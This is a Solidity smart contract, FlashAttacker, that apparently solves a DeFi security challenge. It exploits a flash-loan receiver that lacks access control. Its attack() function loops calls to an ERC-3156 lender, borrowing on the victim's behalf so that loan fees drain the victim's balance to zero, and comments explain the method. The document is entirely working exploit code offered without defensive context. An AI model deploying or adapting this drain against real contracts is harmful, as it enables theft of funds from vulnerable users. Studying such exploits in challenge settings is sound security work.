// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract FlashAttacker {
    address lender;
    address victim;
    constructor(address _lender, address _victim) {
        lender = _lender;
        victim = _victim;
    }

    // The victim's onFlash loan functino is not protected by access control. 
    // anyone can call the lender and request a loan on behalf of the victim.
    // this costs the victim the fee each time. 
    // This attack is doing so in a loop until the victims balance is 0
    function attack() public {
        while (victim.balance > 0) {
            IERC3156FlashLender(lender).flashLoan(
                IERC3156FlashBorrower(victim),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                1,
                ""
            );
        }
    }
}